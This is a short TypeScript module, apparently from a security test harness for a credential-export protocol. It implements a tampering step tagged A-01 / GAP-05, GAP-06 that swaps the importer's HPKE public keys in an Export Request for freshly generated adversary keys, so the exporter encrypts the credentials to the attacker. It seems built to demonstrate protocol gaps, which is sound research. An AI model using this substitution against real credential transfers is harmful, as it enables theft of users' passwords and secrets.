/**
 * A-01 / GAP-05, GAP-06: substitute the importer's HPKE public key(s) in an
 * Export Request with the adversary's own keys. The exporter will encrypt to
 * the adversary instead of the legitimate importer.
 */
import { generateKeyPair, publicKeyToJwk } from "../crypto/hpke.js";
import { ImporterKeyring } from "../cxp/request.js";
import type { ExportRequest } from "../cxp/schema.js";

export async function substituteImporterKey(
  request: ExportRequest,
): Promise<{ tampered: ExportRequest; adversaryKeyring: ImporterKeyring }> {
  const adversaryKeyring = new ImporterKeyring();
  const tamperedHpke = [];
  for (const entry of request.hpke) {
    let keyPair = adversaryKeyring.get(entry.kem);
    if (!keyPair) {
      keyPair = await generateKeyPair(entry.kem);
      adversaryKeyring.set(entry.kem, keyPair);
    }
    const jwk = await publicKeyToJwk(entry.kem, keyPair.publicKey);
    tamperedHpke.push({ ...entry, key: { kty: jwk.kty ?? "", ...jwk } });
  }
  return {
    tampered: { ...request, hpke: tamperedHpke },
    adversaryKeyring,
  };
}
